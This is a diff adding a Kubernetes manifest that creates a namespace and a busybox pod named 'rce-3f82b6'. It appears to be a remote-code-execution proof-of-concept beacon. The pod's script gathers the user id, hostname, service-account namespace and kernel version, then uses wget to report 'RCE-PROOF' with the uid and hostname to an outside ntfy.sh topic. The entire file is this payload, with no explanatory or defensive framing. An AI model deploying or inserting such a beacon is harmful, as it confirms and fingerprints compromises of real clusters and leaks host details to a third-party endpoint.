@@ -1,0 +1,23 @@
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: rce-3f82b6
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: rce-3f82b6
+  namespace: rce-3f82b6
+  labels:
+    app: rce-3f82b6
+spec:
+  restartPolicy: Never
+  containers:
+    - name: c
+      image: busybox:1.36
+      command: ["/bin/sh","-c"]
+      args:
+        - |
+          echo "RCE-apim-rce-e03f82b6 $(id) $(hostname) $(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null) $(uname -a)"
+          wget -qO- "https://ntfy.sh/apim-rce-e03f82b6?msg=RCE-PROOF-$(id -u)-$(hostname)" || true
+          sleep 900
